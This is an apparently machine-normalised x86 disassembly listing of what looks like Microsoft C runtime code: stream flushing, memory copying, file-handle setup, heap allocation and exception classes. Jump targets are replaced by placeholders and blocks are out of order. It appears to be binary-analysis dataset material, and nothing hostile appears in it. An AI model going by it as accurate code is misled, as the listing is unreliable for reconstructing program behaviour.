mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_408ec3
pop ecx
push eax
call sub_408def
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_408f51
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_408ee9
pop ecx
test eax eax
je r-xdata
push esi
call sub_408f99
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_408ec3
push eax
call sub_4102d0
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_408f99
push 0x14
push r--data
call sub_408380
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40906a
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rwxdata ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_4083c5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rwxdata ]
jge r-xdata
push eax
push esi
call sub_407f17
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40903b
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_408f51
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_408f51
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_409073
push 0xc
push r--data
call sub_408380
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_407ed6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_408f51
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4090bc
mov eax [ ebp - 0x1c ]
push esi
call sub_408f99
pop ecx
jmp r-xdata
call sub_4083c5
retn
sub_4090d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_409154 ]
jmp [ ecx * 4 + jump_table_4091d4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409240 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_4093dc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4092e0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4093dc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409240 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4093dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409240 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409240 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409240 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4093dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4093dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4093dc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_409431
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40c060
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rwxdata ] eax
mov [ rwxdata ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rwxdata ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rwxdata ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rwxdata
mov esi ebx
shl esi 0x6
add esi [ rwxdata ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rwxdata ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rwxdata ]
add [ rwxdata ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rwxdata ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40c060
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rwxdata ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_409676
mov edi edi
push esi
push edi
mov edi rwxdata
add edi 0x4
cmp edi rwxdata
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_409812
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_4096c9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40fef2
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_4078ae
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_4078d4
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_40973e
push 0x10
push r--data
call sub_408380
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4096c9
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40980a
mov eax [ ebp - 0x1c ]
sub_409812
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_4078ae
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40786c
pop ecx
mov [ esi ] eax
pop esi
sub_40984c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40fef2
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rwxdata ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_4078d4
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40fef2
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40fef2
push 0x1
mov edi eax
call sub_40fef2
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40fe6c
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4098e8
push 0x10
push r--data
call sub_408380
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40984c
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4099a4
mov eax [ ebp - 0x1c ]
sub_4099ac
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_409812
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4099dd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40b4c3
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_408ec3
pop ecx
push eax
call sub_410a73
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_408ec3
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rwxdata
push esi
call sub_408ec3
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_408ec3
sar eax 0x5
push esi
lea edi [ eax * 4 + rwxdata ]
call sub_408ec3
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_409b3a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_40c2b0
lea esi [ eax + 0x1 ]
push esi
call sub_409ff1
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_410b69
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_409b98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_409b3a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409bbf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_409b7a
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_409b3a
jmp r-xdata
sub_409bff
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_409b98
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409c28
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_409b98
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409c79
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_409b7a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_409e6d
pop ecx
sub_409ca0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_409bbf
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409cc5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_409b7a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_409e6d
pop ecx
sub_409d09
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_409b7a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_409e6d
pop ecx
sub_409d4d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_409b7a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_409e6d
pop ecx
sub_409db5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_409da5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_409e6d
pop ecx
sub_409df4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_410f30
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_409e14
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_410f30
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
pop ebp
retn 0x4
sub_409e35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_410f30
pop ecx
pop ecx
xor ecx ecx
test eax eax
setg cl
mov eax ecx
pop ebp
retn 0x4
sub_409e78
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rwxdata ]
call esi
push [ rwxdata ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_410fb8
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rwxdata ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40c0ac
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40c0ac
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
sub_409f2e
mov edi edi
push esi
push 0x4
push 0x20
call sub_40c060
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
mov [ rwxdata ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_409f5f
push 0xc
push r--data
call sub_408380
call sub_40a1e8
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_409e78
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409f95
mov eax [ ebp - 0x1c ]
call sub_4083c5
retn
sub_409fb2
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
call sub_40a703
push 0x1e
call sub_40a554
push 0xff
call sub_40a1d0
push eax
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
pop ebp
retn
inc eax
sub_409ff1
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_40a0e1
pop ecx
call sub_4078ae
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_40a703
push 0x1e
call sub_40a554
push 0xff
call sub_40a1d0
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rwxdata ] eax
je r-xdata
push eax
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_4078ae
mov [ eax ] esi
push ebx
call sub_40a0e1
pop ecx
test eax eax
jne r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
jmp r-xdata
call sub_4078ae
mov [ eax ] esi
sub_40a094
mov edi edi
push ebp
mov ebp esp
push esi
push 0x4
call sub_40ecce
pop ecx
push [ rwxdata ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
